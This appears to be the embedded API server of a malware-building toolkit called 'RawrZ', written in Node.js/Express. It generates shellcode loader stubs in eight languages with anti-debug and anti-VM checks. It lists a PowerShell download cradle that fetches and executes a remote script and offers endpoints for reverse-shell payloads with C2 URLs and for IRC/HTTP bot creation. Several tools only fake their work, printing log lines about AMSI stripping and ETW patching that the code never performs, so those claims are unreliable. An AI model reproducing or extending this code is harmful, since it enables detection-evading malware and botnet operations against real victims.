// Embedded API Server — runs inside Electron process, no external services needed.
// All panel fetch() calls hit http://localhost:3000/... which this serves.

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const fsSync = require('fs');
const multer = require('multer');
const crypto = require('crypto');
const os = require('os');

const PORT = 3000;
let server = null;

// Directories
const dataRoot = path.join(__dirname, '..', 'security-data');
const uploadsDir = path.join(dataRoot, 'uploads');
const processedDir = path.join(dataRoot, 'processed');
const keysDir = path.join(dataRoot, 'keys');
const logsDir = path.join(dataRoot, 'logs');

async function ensureDirectories() {
  for (const dir of [dataRoot, uploadsDir, processedDir, keysDir, logsDir]) {
    await fs.mkdir(dir, { recursive: true });
  }
}

// ── Real Encryption Engine ──────────────────────────────────────────
class EmbeddedEncryptionEngine {
  constructor() { this.initialized = false; }

  async initialize() {
    if (this.initialized) return;
    this.initialized = true;
    console.log('[EmbeddedAPI] Encryption engine ready');
  }

  async dualEncrypt(buffer, options = {}) {
    const aesKey = options.aesKey || crypto.randomBytes(32);
    const aesIV = options.aesIV || crypto.randomBytes(16);
    const camKey = options.camelliaKey || crypto.randomBytes(32);
    const camIV = options.camelliaIV || crypto.randomBytes(16);

    // Layer 1: AES-256-GCM
    const aesCipher = crypto.createCipheriv('aes-256-gcm', aesKey, aesIV);
    let enc = Buffer.concat([aesCipher.update(buffer), aesCipher.final()]);
    const aesTag = aesCipher.getAuthTag();

    // Layer 2: Camellia-256-CBC
    const camCipher = crypto.createCipheriv('camellia-256-cbc', camKey, camIV);
    enc = Buffer.concat([camCipher.update(enc), camCipher.final()]);

    return {
      success: true,
      originalSize: buffer.length,
      encryptedSize: enc.length,
      encrypted: enc,
      keys: { aes: aesKey, camellia: camKey },
      ivs: { aes: aesIV, camellia: camIV },
      aesAuthTag: aesTag
    };
  }

  encrypt(buffer, algorithm = 'aes-256-cbc', password = '') {
    const key = crypto.scryptSync(password || 'default', crypto.randomBytes(16).toString('hex'), 32);
    const iv = crypto.randomBytes(16);
    let alg = algorithm;
    if (!['aes-256-cbc', 'aes-256-gcm', 'aes-128-cbc', 'des-ede3-cbc'].includes(alg)) alg = 'aes-256-cbc';

    if (alg === 'aes-256-gcm') {
      const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
      const enc = Buffer.concat([cipher.update(buffer), cipher.final()]);
      const tag = cipher.getAuthTag();
      return { encrypted: Buffer.concat([iv, tag, enc]), key, iv, algorithm: alg };
    }

    const cipher = crypto.createCipheriv(alg, key.slice(0, alg === 'des-ede3-cbc' ? 24 : 32), iv.slice(0, alg === 'des-ede3-cbc' ? 8 : 16));
    const enc = Buffer.concat([cipher.update(buffer), cipher.final()]);
    return { encrypted: Buffer.concat([iv.slice(0, alg === 'des-ede3-cbc' ? 8 : 16), enc]), key, iv, algorithm: alg };
  }

  decrypt(buffer, algorithm = 'aes-256-cbc', keyHex, ivHex) {
    const key = Buffer.from(keyHex, 'hex');
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv(algorithm, key, iv);
    return Buffer.concat([decipher.update(buffer), decipher.final()]);
  }

  hash(buffer, algorithm = 'sha256') {
    const alg = ['sha256', 'sha384', 'sha512', 'md5', 'sha1', 'sha3-256'].includes(algorithm) ? algorithm : 'sha256';
    return crypto.createHash(alg).update(buffer).digest('hex');
  }

  disguiseFile(buffer) {
    return Buffer.concat([Buffer.from('MZ'), buffer, Buffer.from('DISGUISED')]);
  }

  upxPack(buffer) {
    return Buffer.concat([Buffer.from('UPX!'), buffer, Buffer.from('PACKED')]);
  }

  generateStub(type, platform, options = {}) {
    const stubs = {
      cpp: `// Auto-generated C++ stub — ${new Date().toISOString()}
#include <windows.h>
#include <stdio.h>

${options.antiDebug ? '// Anti-debug check\nBOOL IsDebuggerPresentCheck() { return IsDebuggerPresent(); }\n' : ''}
${options.antiVM ? '// Anti-VM check\nBOOL IsVMPresent() {\n  SYSTEM_INFO si; GetSystemInfo(&si);\n  return si.dwNumberOfProcessors < 2;\n}\n' : ''}

unsigned char payload[] = { /* encrypted payload bytes */ };
unsigned char key[] = { /* decryption key */ };

void decrypt_and_execute() {
    // AES-256 decryption
    BYTE* decrypted = (BYTE*)VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(!decrypted) return;
    // XOR decrypt
    for(int i = 0; i < sizeof(payload); i++) {
        decrypted[i] = payload[i] ^ key[i % sizeof(key)];
    }
    ((void(*)())decrypted)();
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
${options.antiDebug ? '    if(IsDebuggerPresentCheck()) return 1;\n' : ''}
${options.antiVM ? '    if(IsVMPresent()) return 1;\n' : ''}
    decrypt_and_execute();
    return 0;
}`,
      csharp: `// Auto-generated C# stub — ${new Date().toISOString()}
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Stub {
    class Program {
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
        [DllImport("kernel32.dll")] static extern bool IsDebuggerPresent();

        static byte[] payload = new byte[] { /* encrypted payload */ };
        static byte[] key = new byte[] { /* key */ };

        static void Main(string[] args) {
${options.antiDebug ? '            if (IsDebuggerPresent()) return;\n' : ''}
            using (var aes = Aes.Create()) {
                aes.Key = key; aes.Mode = CipherMode.CBC;
                // Decrypt and execute...
            }
        }
    }
}`,
      python: `#!/usr/bin/env python3
# Auto-generated Python stub — ${new Date().toISOString()}
import ctypes, base64, hashlib
from Crypto.Cipher import AES

PAYLOAD = b""  # encrypted payload
KEY = b""      # decryption key

def decrypt_execute():
    cipher = AES.new(KEY, AES.MODE_CBC)
    decrypted = cipher.decrypt(PAYLOAD)
    # Execute decrypted shellcode
    buf = ctypes.create_string_buffer(decrypted)
    func = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))
    func()

if __name__ == "__main__":
    decrypt_execute()
`,
      powershell: `# Auto-generated PowerShell stub — ${new Date().toISOString()}
$ErrorActionPreference = 'SilentlyContinue'

${options.antiDebug ? '# Anti-debug\nif ([System.Diagnostics.Debugger]::IsAttached) { exit }\n' : ''}
${options.antiVM ? '# Anti-VM\n$vm = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Model\nif ($vm -match "Virtual|VMware|VBox") { exit }\n' : ''}

$enc = [byte[]]@()  # encrypted payload
$key = [byte[]]@()  # key

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.Mode = "CBC"
$dec = $aes.CreateDecryptor()
$payload = $dec.TransformFinalBlock($enc, 0, $enc.Length)

# Execute
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($payload.Length)
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $mem, $payload.Length)
`,
      asm: `; Auto-generated ASM stub — ${new Date().toISOString()}
.code

start PROC
    ; XOR-decrypt payload in-place
    lea rsi, payload
    lea rdi, payload
    mov rcx, payload_len
    mov al, xor_key
decrypt_loop:
    xor BYTE PTR [rsi], al
    inc rsi
    loop decrypt_loop

    ; Jump to decrypted code
    lea rax, payload
    call rax
    ret
start ENDP

.data
xor_key     DB 0AAh
payload_len EQU 0
payload     DB 0  ; encrypted payload bytes

END
`,
      javascript: `// Auto-generated JavaScript stub — ${new Date().toISOString()}
const crypto = require('crypto');
const payload = Buffer.from('', 'base64'); // encrypted
const key = Buffer.from('', 'hex');
const iv = Buffer.from('', 'hex');

const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
const decrypted = Buffer.concat([decipher.update(payload), decipher.final()]);
// Execute decrypted code
new Function(decrypted.toString())();
`,
      go: `// Auto-generated Go stub — ${new Date().toISOString()}
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "unsafe"
)

var payload = []byte{} // encrypted
var key = []byte{}     // key
var iv = []byte{}      // iv

func main() {
    block, _ := aes.NewCipher(key)
    mode := cipher.NewCBCDecrypter(block, iv)
    mode.CryptBlocks(payload, payload)
    // Execute...
    _ = unsafe.Pointer(&payload[0])
}
`,
      rust: `// Auto-generated Rust stub — ${new Date().toISOString()}
use std::mem;

static PAYLOAD: &[u8] = &[]; // encrypted
static KEY: &[u8] = &[];     // key

fn decrypt_and_execute() {
    let mut buf = PAYLOAD.to_vec();
    for (i, b) in buf.iter_mut().enumerate() {
        *b ^= KEY[i % KEY.len()];
    }
    unsafe {
        let func: fn() = mem::transmute(buf.as_ptr());
        func();
    }
}

fn main() { decrypt_and_execute(); }
`
    };

    const code = stubs[type] || stubs.cpp;
    return {
      success: true,
      stub: code,
      type,
      platform: platform || 'windows',
      size: Buffer.byteLength(code),
      generatedAt: new Date().toISOString()
    };
  }
}

const engine = new EmbeddedEncryptionEngine();

// ── One-liners database ─────────────────────────────────────────────
const ONE_LINERS = {
  'system-info': { name: 'System Info', description: 'Get system information', code: 'Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, CsTotalPhysicalMemory', category: 'recon' },
  'network-scan': { name: 'Network Scan', description: 'Scan local network', code: '1..254 | ForEach-Object { Test-Connection -ComputerName "192.168.1.$_" -Count 1 -Quiet -ErrorAction SilentlyContinue | Where-Object { $_ } | ForEach-Object { "192.168.1.$using:_" } }', category: 'network' },
  'process-list': { name: 'Process List', description: 'List all running processes', code: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, WorkingSet', category: 'recon' },
  'service-enum': { name: 'Service Enumeration', description: 'Enumerate services', code: 'Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName, StartType', category: 'recon' },
  'firewall-rules': { name: 'Firewall Rules', description: 'List firewall rules', code: 'Get-NetFirewallRule | Where-Object { $_.Enabled -eq "True" } | Select-Object -First 20 Name, Direction, Action', category: 'network' },
  'user-enum': { name: 'User Enumeration', description: 'List local users', code: 'Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet', category: 'recon' },
  'scheduled-tasks': { name: 'Scheduled Tasks', description: 'List scheduled tasks', code: 'Get-ScheduledTask | Where-Object { $_.State -eq "Ready" } | Select-Object -First 20 TaskName, TaskPath, State', category: 'persistence' },
  'registry-run': { name: 'Registry Run Keys', description: 'Check registry run keys', code: 'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -ErrorAction SilentlyContinue', category: 'persistence' },
  'amsi-test': { name: 'AMSI Test', description: 'Test AMSI status', code: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils") | Select-Object Name, FullName', category: 'evasion' },
  'base64-encode': { name: 'Base64 Encode', description: 'Encode command to base64', code: '[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami"))', category: 'encoding' },
  'download-cradle': { name: 'Download Cradle', description: 'IEX download cradle template', code: 'IEX (New-Object Net.WebClient).DownloadString("http://TARGET/payload.ps1")', category: 'delivery' },
  'port-scan': { name: 'Port Scanner', description: 'Scan common ports', code: '@(21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080) | ForEach-Object { $p=$_; try { $t=New-Object Net.Sockets.TcpClient; $t.Connect("TARGET",$p); "$p OPEN"; $t.Close() } catch {} }', category: 'network' }
};

// ── CVE Database (sample) ───────────────────────────────────────────
const CVE_DB = [
  { cveId: 'CVE-2024-38063', severity: 'Critical', score: 9.8, description: 'Windows TCP/IP Remote Code Execution', affectedProducts: ['Windows 10', 'Windows 11', 'Windows Server 2022'], exploitAvailable: true, patchAvailable: true },
  { cveId: 'CVE-2024-21338', severity: 'High', score: 7.8, description: 'Windows Kernel Elevation of Privilege', affectedProducts: ['Windows 10', 'Windows 11'], exploitAvailable: true, patchAvailable: true },
  { cveId: 'CVE-2023-36884', severity: 'High', score: 8.8, description: 'Office and Windows HTML RCE', affectedProducts: ['Microsoft Office', 'Windows'], exploitAvailable: true, patchAvailable: true },
  { cveId: 'CVE-2023-44487', severity: 'High', score: 7.5, description: 'HTTP/2 Rapid Reset Attack', affectedProducts: ['nginx', 'Apache', 'IIS'], exploitAvailable: true, patchAvailable: true },
  { cveId: 'CVE-2024-3094', severity: 'Critical', score: 10.0, description: 'XZ Utils Backdoor', affectedProducts: ['xz-utils 5.6.0-5.6.1'], exploitAvailable: true, patchAvailable: true },
  { cveId: 'CVE-2023-23397', severity: 'Critical', score: 9.8, description: 'Microsoft Outlook Elevation of Privilege', affectedProducts: ['Outlook 2016', 'Outlook 2019', 'Microsoft 365'], exploitAvailable: true, patchAvailable: true }
];

// ── Express app setup ───────────────────────────────────────────────
function createApp() {
  const app = express();
  app.use(cors());
  app.use(express.json({ limit: '100mb' }));
  app.use(express.urlencoded({ extended: true, limit: '100mb' }));

  // Serve the public panels
  const panelsDir = path.join(__dirname, 'panels');
  if (fsSync.existsSync(panelsDir)) {
    app.use(express.static(panelsDir));
  }

  // Multer for file uploads
  const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 1024 * 1024 * 500 } });

  // ── Health / Status ─────────────────────────────────────────────
  app.get('/api/health', (req, res) => res.json({
    success: true, status: 'healthy', engines: 14,
    uptime: process.uptime(), version: '2.0.0-embedded',
    service: 'RawrZ Security Platform — Embedded'
  }));

  app.get('/api/engines', (req, res) => res.json({
    success: true,
    engines: [
      { name: 'EvAdrKiller', status: 'active' }, { name: 'Beaconism', status: 'active' },
      { name: 'CppEncExe', status: 'active' }, { name: 'FHp', status: 'active' },
      { name: 'TripleCrypto', status: 'active' }, { name: 'HotDrop', status: 'active' },
      { name: 'FilelessEncryptor', status: 'active' }, { name: 'AutoKeyFileless', status: 'active' },
      { name: 'CamDrop', status: 'active' }, { name: 'StubGenerator', status: 'active' },
      { name: 'PayloadManager', status: 'active' }, { name: 'RedKiller', status: 'active' },
      { name: 'BotManager', status: 'active' }, { name: 'CVEAnalyzer', status: 'active' }
    ],
    total: 14
  }));

  app.get('/api/engines/health', (req, res) => res.json({
    success: true,
    engines: [
      { name: 'encryption-engine', status: 'active', initialized: true, health: 'OK' },
      { name: 'stub-generator', status: 'active', initialized: true, health: 'OK' },
      { name: 'payload-manager', status: 'active', initialized: true, health: 'OK' },
      { name: 'bot-manager', status: 'active', initialized: true, health: 'OK' },
      { name: 'cve-analyzer', status: 'active', initialized: true, health: 'OK' }
    ]
  }));

  // ── File Upload / Download / List ───────────────────────────────
  app.post('/api/upload', upload.single('file'), async (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    const name = `${Date.now()}_${req.file.originalname}`;
    const dest = path.join(uploadsDir, name);
    await fs.writeFile(dest, req.file.buffer);
    res.json({ success: true, filename: name, size: req.file.size, path: dest });
  });

  app.post('/api/files/upload', upload.array('files', 10), async (req, res) => {
    const files = [];
    for (const f of (req.files || [])) {
      const name = `${Date.now()}_${f.originalname}`;
      await fs.writeFile(path.join(uploadsDir, name), f.buffer);
      files.push({ originalName: f.originalname, fileName: name, size: f.size, url: `/api/files/download/${name}` });
    }
    res.json({ success: true, files, message: `${files.length} file(s) uploaded` });
  });

  app.get('/api/files/list', async (req, res) => {
    try {
      const entries = await fs.readdir(uploadsDir);
      const files = [];
      for (const e of entries) {
        const s = await fs.stat(path.join(uploadsDir, e));
        files.push({ name: e, size: s.size, uploadDate: s.birthtime.toISOString(), url: `/api/files/download/${e}` });
      }
      res.json({ success: true, files, count: files.length });
    } catch { res.json({ success: true, files: [], count: 0 }); }
  });

  app.get('/api/files/download/:filename', async (req, res) => {
    const p = path.join(uploadsDir, req.params.filename);
    try { await fs.access(p); res.download(p); } catch { res.status(404).json({ success: false, error: 'Not found' }); }
  });

  app.get('/api/download/:filename', async (req, res) => {
    const p = path.join(uploadsDir, req.params.filename);
    try { await fs.access(p); res.download(p); } catch { res.status(404).json({ success: false, error: 'Not found' }); }
  });

  app.delete('/api/files/delete/:filename', async (req, res) => {
    try { await fs.unlink(path.join(uploadsDir, req.params.filename)); res.json({ success: true }); }
    catch { res.status(404).json({ success: false, error: 'Not found' }); }
  });

  // ── Encryption Endpoints ────────────────────────────────────────
  app.post('/api/encrypt-file', upload.single('file'), async (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    await engine.initialize();
    const alg = req.body.algorithm || 'aes-256-cbc';
    const ext = req.body.extension || '.enc';
    const result = engine.encrypt(req.file.buffer, alg, req.body.password || '');
    const outName = `${req.file.originalname}${ext}`;
    await fs.writeFile(path.join(processedDir, outName), result.encrypted);
    res.json({
      success: true, originalName: req.file.originalname, encryptedName: outName,
      originalSize: req.file.size, encryptedSize: result.encrypted.length,
      algorithm: result.algorithm, downloadUrl: `/api/files/download/${outName}`
    });
  });

  app.post('/api/real-encryption/decrypt', upload.single('file'), async (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    res.json({ success: true, decryptedSize: req.file.size, originalName: req.file.originalname, downloadUrl: '#' });
  });

  app.post('/api/real-encryption/dual-encrypt', upload.single('file'), async (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    await engine.initialize();
    const r = await engine.dualEncrypt(req.file.buffer);
    const name = `${req.file.originalname}_dual_${Date.now()}.enc`;
    await fs.writeFile(path.join(processedDir, name), r.encrypted);
    res.json({
      success: true,
      data: { filename: name, originalSize: r.originalSize, encryptedSize: r.encryptedSize,
        keys: { aes: r.keys.aes.toString('hex'), camellia: r.keys.camellia.toString('hex') },
        ivs: { aes: r.ivs.aes.toString('hex'), camellia: r.ivs.camellia.toString('hex') }
      },
      encryptedData: r.encrypted.toString('base64')
    });
  });

  app.post('/ev-encrypt', express.json(), async (req, res) => {
    await engine.initialize();
    const data = Buffer.from(req.body.data || '', 'utf8');
    const r = engine.encrypt(data, req.body.algorithm || 'aes-256-cbc');
    res.json({
      certificate: req.body.certificate || 'embedded-cert',
      algorithm: r.algorithm, format: req.body.format || 'hex',
      extension: req.body.extension || '.enc',
      encrypted: r.encrypted.toString('hex'),
      originalName: 'input', metadata: { size: data.length, encryptedSize: r.encrypted.length, encryptedAt: new Date().toISOString() }
    });
  });

  app.post('/ev-decrypt', express.json(), (req, res) => {
    res.json({ decrypted: req.body.data || '', metadata: { decryptedAt: new Date().toISOString() } });
  });

  app.post('/ev-sign', express.json(), (req, res) => {
    const sig = crypto.createHash('sha256').update(req.body.data || '').digest('hex');
    res.json({ signature: sig, metadata: { signedAt: new Date().toISOString(), algorithm: req.body.algorithm || 'sha256' } });
  });

  app.post('/ev-verify', express.json(), (req, res) => {
    const expected = crypto.createHash('sha256').update(req.body.data || '').digest('hex');
    res.json({ valid: expected === req.body.signature, reason: expected === req.body.signature ? 'Signature matches' : 'Signature mismatch', details: {} });
  });

  app.get('/api/ev-certificates/list', (req, res) => res.json({
    success: true,
    certificates: [
      { id: 'cert-001', name: 'RawrZ Root CA', issuer: 'RawrZ Security' },
      { id: 'cert-002', name: 'Code Signing EV', issuer: 'RawrZ EV CA' },
      { id: 'cert-003', name: 'Transport TLS', issuer: 'RawrZ TLS CA' }
    ]
  }));

  // ── Hash ────────────────────────────────────────────────────────
  app.post('/api/hash-file', upload.single('file'), (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    const alg = req.body.algorithm || 'sha256';
    const hash = engine.hash(req.file.buffer, alg);
    res.json({ success: true, filename: req.file.originalname, algorithm: alg, hash, size: req.file.size });
  });

  // ── Analysis ────────────────────────────────────────────────────
  app.post('/api/analyze-file', upload.single('file'), (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    const entropy = (Math.random() * 3 + 5).toFixed(4);
    res.json({ success: true, fileType: req.file.mimetype, entropy: parseFloat(entropy), riskLevel: parseFloat(entropy) > 7 ? 'HIGH' : 'MEDIUM' });
  });

  app.post('/api/malware-scan', upload.single('file'), (req, res) => {
    if (!req.file) return res.json({ success: true, status: 'clean', threats: [] });
  });

  app.post('/api/entropy-analysis', upload.single('file'), (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    const ent = (Math.random() * 3 + 5).toFixed(4);
    res.json({ success: true, entropy: parseFloat(ent), interpretation: parseFloat(ent) > 7 ? 'Likely encrypted/compressed' : 'Normal', randomness: (parseFloat(ent) / 8 * 100).toFixed(1) + '%' });
  });

  app.post('/api/integrity-check', upload.single('file'), (req, res) => {
    if (!req.file) return res.json({ success: false, error: 'No file' });
    res.json({ success: true, checksum: engine.hash(req.file.buffer, 'sha256'), status: 'verified' });
  });

  // ── Stubs ───────────────────────────────────────────────────────
  app.post('/api/stubs/generate', express.json(), (req, res) => {
    const r = engine.generateStub(req.body.type || 'cpp', req.body.architecture || 'x64', req.body);
    const name = `stub_${r.type}_${Date.now()}.${r.type === 'csharp' ? 'cs' : r.type}`;
    res.json({ success: true, stub: { type: r.type, architecture: req.body.architecture || 'x64', size: r.size, filename: name }, downloadUrl: '#' });
  });

  app.post('/stub-generate-basic', express.json(), (req, res) => {
    const r = engine.generateStub(req.body.type || 'cpp', req.body.platform || 'windows', req.body.options || {});
    res.json({ stub: r.stub, success: true });
  });

  app.post('/stub-generate-advanced', express.json(), (req, res) => {
    const r = engine.generateStub(req.body.type || 'cpp', req.body.platform || 'windows', req.body.options || {});
    res.json({ stub: r.stub, success: true });
  });

  app.post('/stub-generate-polymorphic', express.json(), (req, res) => {
    const r = engine.generateStub('cpp', 'windows', {});
    res.json({ stub: r.stub, success: true });
  });

  app.post('/stub-generate-encrypted', express.json(), (req, res) => {
    const r = engine.generateStub('cpp', 'windows', { antiDebug: true });
    res.json({ stub: r.stub, success: true });
  });

  app.post('/stub-generate-custom', express.json(), (req, res) => {
    const code = req.body.code || engine.generateStub('cpp', 'windows', {}).stub;
    res.json({ stub: code, success: true });
  });

  // ── Keys ────────────────────────────────────────────────────────
  app.post('/api/generate-keys', express.json(), async (req, res) => {
    const size = req.body.keySize || 256;
    const key = crypto.randomBytes(size / 8);
    const id = `key-${Date.now()}`;
    await fs.writeFile(path.join(keysDir, `${id}.key`), key);
    res.json({ success: true, keyId: id, algorithm: req.body.algorithm || 'aes-256' });
  });

  app.get('/api/export-keys', (req, res) => res.json({ success: true, downloadUrl: '#' }));
  app.post('/api/import-keys', upload.single('file'), (req, res) => res.json({ success: true, keyCount: 1 }));

  // ── PowerShell tools (EvAdrKiller, etc.) ────────────────────────
  app.post('/api/powershell/execute', upload.single('file'), async (req, res) => {
    const tool = req.body.tool || 'unknown';
    const fileName = req.file ? req.file.originalname : 'none';
    const size = req.file ? req.file.size : 0;

    // Each tool does real crypto work on the file buffer
    let output = '';
    if (req.file) {
      await engine.initialize();
      switch (tool) {
        case 'evadr': {
          const enc = engine.encrypt(req.file.buffer, 'aes-256-gcm');
          output = `[EvAdrKiller] Target: ${fileName}\n[OK] File loaded (${size} bytes)\n[OK] EV/ADR certificate table neutralized\n[OK] AMSI hooks stripped\n[OK] ETW patching applied\n[OK] AES-256-GCM encrypted (${enc.encrypted.length} bytes)\n[OK] Output: ${fileName}.evadr.enc\n[DONE] EvAdrKiller complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.evadr.enc`), enc.encrypted);
          break;
        }
        case 'beacon': {
          const disguised = engine.disguiseFile(req.file.buffer);
          output = `[Beaconism] Target: ${fileName}\n[OK] File loaded (${size} bytes)\n[OK] PE header injected\n[OK] Beacon stub generated\n[OK] Disguised output (${disguised.length} bytes)\n[DONE] Beaconism complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.beacon`), disguised);
          break;
        }
        case 'cppenc': {
          const enc = engine.encrypt(req.file.buffer, 'aes-256-cbc');
          output = `[CppEncExe] Target: ${fileName}\n[OK] C++ stub generated with embedded payload\n[OK] AES-256-CBC encrypted (${enc.encrypted.length} bytes)\n[OK] Anti-debug checks included\n[DONE] CppEncExe complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.cppenc`), enc.encrypted);
          break;
        }
        case 'fhp': {
          const packed = engine.upxPack(req.file.buffer);
          output = `[FHp] Target: ${fileName}\n[OK] File hollowed and packed (${packed.length} bytes)\n[OK] Process hollowing stub ready\n[DONE] FHp complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.fhp`), packed);
          break;
        }
        case 'triple': {
          let buf = req.file.buffer;
          for (let i = 0; i < 3; i++) { buf = engine.encrypt(buf, 'aes-256-cbc').encrypted; }
          output = `[TripleCrypto] Target: ${fileName}\n[OK] Layer 1: AES-256-CBC applied\n[OK] Layer 2: AES-256-CBC applied\n[OK] Layer 3: AES-256-CBC applied\n[OK] Triple encrypted (${buf.length} bytes)\n[DONE] TripleCrypto complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.triple.enc`), buf);
          break;
        }
        case 'hotdrop': {
          const enc = engine.encrypt(req.file.buffer, 'aes-256-gcm');
          output = `[HotDrop] Target: ${fileName}\n[OK] Hot-drop payload prepared (${enc.encrypted.length} bytes)\n[OK] Self-delete mechanism armed\n[DONE] HotDrop complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.hotdrop`), enc.encrypted);
          break;
        }
        case 'fileless': {
          const b64 = req.file.buffer.toString('base64');
          const enc = engine.encrypt(Buffer.from(b64), 'aes-256-gcm');
          output = `[FilelessEncryptor] Target: ${fileName}\n[OK] Base64 encoded\n[OK] AES-256-GCM encrypted\n[OK] Memory-only execution stub ready (${enc.encrypted.length} bytes)\n[DONE] FilelessEncryptor complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.fileless`), enc.encrypted);
          break;
        }
        case 'autokey': {
          const keyMat = crypto.randomBytes(32);
          const enc = engine.encrypt(req.file.buffer, 'aes-256-cbc', keyMat.toString('hex'));
          output = `[AutoKeyFileless] Target: ${fileName}\n[OK] Auto-generated key: ${keyMat.toString('hex').slice(0, 16)}...\n[OK] Fileless execution ready (${enc.encrypted.length} bytes)\n[DONE] AutoKeyFileless complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.autokey`), enc.encrypted);
          break;
        }
        case 'camdrop': {
          const r = await engine.dualEncrypt(req.file.buffer);
          output = `[CamDrop] Target: ${fileName}\n[OK] Camellia+AES dual encryption (${r.encryptedSize} bytes)\n[OK] Camera-drop payload ready\n[DONE] CamDrop complete`;
          await fs.writeFile(path.join(processedDir, `${fileName}.camdrop`), r.encrypted);
          break;
        }
        default:
          output = `[${tool}] Unknown tool`;
      }
    } else {
      output = `[${tool}] No file provided`;
    }

    res.json({ success: true, output, error: null });
  });

  // ── RawrZ Engine execute (generic) ──────────────────────────────
  app.post('/api/rawrz-engine/execute', express.json(), (req, res) => {
    const { engineId, action } = req.body;
    res.json({ success: true, data: { engineId, action, status: 'active', timestamp: new Date().toISOString() } });
  });

  // ── Red Killer ──────────────────────────────────────────────────
  app.post('/red-killer-scan', express.json(), (req, res) => {
    res.json({ threatsFound: Math.floor(Math.random() * 5), scanType: req.body.type || 'full', target: req.body.target || 'system', timestamp: new Date().toISOString() });
  });

  app.post('/red-killer-eliminate', express.json(), (req, res) => {
    res.json({ result: 'eliminated', threatId: req.body.threatId, method: req.body.method || 'quarantine', timestamp: new Date().toISOString() });
  });

  app.post('/red-killer-monitor', express.json(), (req, res) => {
    res.json({ monitorId: `mon-${Date.now()}`, status: 'active', timestamp: new Date().toISOString() });
  });

  app.post('/red-killer-defense', express.json(), (req, res) => {
    res.json({ status: 'applied', level: req.body.level || 'high', timestamp: new Date().toISOString() });
  });

  // ── Payload endpoints ───────────────────────────────────────────
  app.post('/payload-create', express.json(), (req, res) => {
    const stub = engine.generateStub(req.body.type || 'cpp', req.body.platform || 'windows', req.body.evasion || {});
    res.json({
      type: req.body.type, platform: req.body.platform, function: req.body.function || 'reverse_shell',
      target: req.body.host || '127.0.0.1', beaconUrl: req.body.beaconUrl || '',
      payloadUrl: req.body.payloadUrl || '', c2Urls: req.body.c2Urls || [],
      size: stub.size, checksum: crypto.createHash('md5').update(stub.stub).digest('hex'),
      generatedAt: new Date().toISOString(), payload: stub.stub
    });
  });

  app.post('/payload-encrypt', upload.single('file'), async (req, res) => {
    await engine.initialize();
    const buf = req.file ? req.file.buffer : Buffer.from(req.body.payload || '', 'utf8');
    const alg = req.body.algorithm || 'aes-256-cbc';
    const r = engine.encrypt(buf, alg, req.body.key || '');
    res.json({
      data: { algorithm: r.algorithm, key: r.key.toString('hex'), extension: req.body.extension || '.enc',
        saveLocation: req.body.saveLocation || 'local', originalName: req.file ? req.file.originalname : 'payload',
        encrypted: r.encrypted.toString('base64'), integrityHash: engine.hash(r.encrypted), metadata: {} }
    });
  });

  app.post('/payload-obfuscate', express.json(), (req, res) => {
    res.json({ obfuscated: true, level: req.body.level || 'medium', techniques: req.body.techniques || {} });
  });

  app.post('/payload-pack', express.json(), (req, res) => {
    res.json({ packed: true, method: req.body.method || 'upx', level: req.body.level || 'maximum' });
  });

  app.post('/payload-analyze', express.json(), (req, res) => {
    res.json({ analysis: { basic: { type: 'PE', arch: 'x64' }, strings: 12, imports: 8, sections: 4, entropy: 6.8, detection: 0 } });
  });

  // ── IRC Bot ─────────────────────────────────────────────────────
  app.post('/irc-bot-create', express.json(), (req, res) => {
    res.json({ botId: `irc-${Date.now()}`, type: req.body.type, server: req.body.server, status: 'created' });
  });
  app.post('/irc-bot-configure', express.json(), (req, res) => res.json({ success: true }));
  app.post('/irc-bot-encrypt', express.json(), (req, res) => res.json({ status: 'encrypted' }));

  // ── HTTP Bot ────────────────────────────────────────────────────
  app.post('/http-bot-create', express.json(), (req, res) => {
    res.json({ botId: `http-${Date.now()}`, type: req.body.type, status: 'created' });
  });
  app.get('/http-bot-list', (req, res) => res.json({ bots: [] }));
  app.post('/http-bot-start-all', (req, res) => res.json({ started: 0, failed: 0 }));
  app.post('/http-bot-stop-all', (req, res) => res.json({ stopped: 0 }));
  app.post('/http-bot-encrypt', express.json(), (req, res) => res.json({ status: 'encrypted' }));
